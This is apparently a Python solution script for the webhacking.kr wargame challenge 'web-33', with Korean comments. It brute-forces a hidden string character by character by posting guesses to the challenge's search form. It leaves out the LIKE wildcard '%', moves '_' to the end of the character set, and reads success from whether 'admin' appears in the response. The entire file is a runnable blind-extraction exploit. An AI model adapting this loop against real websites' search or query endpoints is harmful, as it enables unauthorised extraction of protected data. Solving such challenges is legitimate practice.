import requests
import string

url = 'https://webhacking.kr/challenge/web-33/'
TRUE_FLAG = 'admin'
secret = 'a'
data = {}
exit = 0

print(string.printable)
# string.printable = '0123456789
#                     abcdefghijklmnopqrstuvwxyz
#                     ABCDEFGHIJKLMNOPQRSTUVWXYZ
#                     !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~'

# '%' 는 삭제하고, '_'는 맨 마지막에 추가
printable_string = string.printable
printable_string = printable_string.replace('%','')
printable_string = printable_string.replace('_','')
printable_string = printable_string + '_'


# a부터 뒷글자들을 먼저 맞춘다.
while exit==0:
    for character in printable_string:
        data['search'] = secret + character
        response = requests.post(url,data=data)
        if(TRUE_FLAG in response.text):
            secret = data['search']
            print('\r[+]',secret,end='')
            break
        if(character == printable_string[-1]):
            exit=1
            print("break while loop")


# 앞부분을 채워 넣기
exit = 0
while exit==0:
    for character in printable_string:
        data['search'] = character + secret
        response = requests.post(url,data=data)
        if(TRUE_FLAG in response.text):
            secret = data['search']
            print('\r[+]',secret,end='')
            break    

        if(character == printable_string[-1]):
            exit=1
            print("break while loop")
            print(secret)
